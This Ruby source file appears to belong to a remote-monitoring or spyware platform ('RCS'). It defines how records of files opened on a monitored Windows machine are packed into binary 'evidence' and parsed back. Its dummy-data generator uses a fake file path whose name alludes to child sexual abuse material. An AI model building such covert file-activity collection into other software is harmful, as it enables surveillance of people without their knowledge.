require 'rcs-common/evidence/common'

module RCS

module FileopenEvidence

  ELEM_DELIMITER = 0xABADC0DE

  def content
    process = "Explorer.exe\0".encode("US-ASCII")
    file = "c:\\Utenti\\pippo\\pedoporno.mpg".to_utf16le_binary_null
    content = StringIO.new
    t = Time.now.getutc
    content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
    content.write process
    content.write [ 0 ].pack('L') # size hi
    content.write [ 123456789 ].pack('L') # size lo
    content.write [ 0x80000000 ].pack('l') # access mode
    content.write file
    content.write [ ELEM_DELIMITER ].pack('L')
    content.string
  end
  
  def generate_content
    ret = Array.new
    (rand(10)).times { ret << content() }
    ret
  end
  
  def decode_content
    stream = StringIO.new @info[:chunks].join

    evidences = Array.new
    until stream.eof?
      tm = stream.read 36
      @info[:acquired] = Time.gm(*tm.unpack('l*'), 0)
      @info[:process] = ''
      @info[:file] = ''

      process_name = stream.read_ascii_string
      @info[:process] = process_name.force_encoding('US-ASCII') unless process_name.nil?

      size_hi = stream.read(4).unpack("L").first
      size_lo = stream.read(4).unpack("L").first
      #TODO: remove hi and lo when mongo is in place
      @info[:size_hi] = size_hi
      @info[:size_lo] = size_lo
      @info[:size] = size_hi << 32 | size_lo
      @info[:mode] = stream.read(4).unpack("l").first

      file = stream.read_utf16le_string
      @info[:file] = file.utf16le_to_utf8 unless file.nil?
      
      delim = stream.read(4).unpack("L*").first
      raise EvidenceDeserializeError.new("Malformed evidence (missing delimiter)") unless delim == ELEM_DELIMITER

      # this is not the real clone! redefined clone ...
      evidences << self.clone
    end
    
    return evidences
  end
end

end # ::RCS